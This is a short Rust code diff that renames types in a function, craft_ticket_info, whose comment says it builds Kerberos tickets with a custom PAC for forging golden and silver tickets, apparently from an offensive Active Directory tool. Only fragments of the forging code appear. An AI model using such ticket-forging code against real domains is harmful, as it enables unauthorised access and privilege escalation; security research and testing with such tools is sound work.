@@ -1,8 +1,8 @@
 use crate::core::{
     new_nt_principal, new_principal_or_srv_inst, new_signed_pac, Cipher,
-    TicketCredInfo,
+    TicketCred,
 };
-use crate::KerberosUser;
+use crate::KrbUser;
 use chrono::{Duration, Utc};
 use kerberos_asn1::{
     Asn1Object, AuthorizationDataEntry, EncTicketPart, EncryptedData,
@@ -20,14 +20,14 @@ use ms_pac::PISID;
 /// Creates a pair Ticket/KrbCredInfo with a custom PAC structure
 /// To create golden/silver tickets ;)
 pub fn craft_ticket_info(
-    user: KerberosUser,
+    user: KrbUser,
     service: Option<String>,
     user_key: Key,
     user_rid: u32,
     domain_sid: PISID,
     groups: &[u32],
     etype: Option<i32>,
-) -> TicketCredInfo {
+) -> TicketCred {
     let cipher = Cipher::generate(&user_key, &user, etype);
     let session_key = random_key(cipher.etype());
     let spn = service.unwrap_or(format!("krbtgt/{}", &user.realm));
@@ -85,7 +85,7 @@ pub fn craft_ticket_info(
         renew_till,
     );
 
-    return TicketCredInfo::new(ticket, krb_cred_info);
+    return TicketCred::new(ticket, krb_cred_info);
 }
 
 /// Creates a Ticket which contains a custom PAC structure
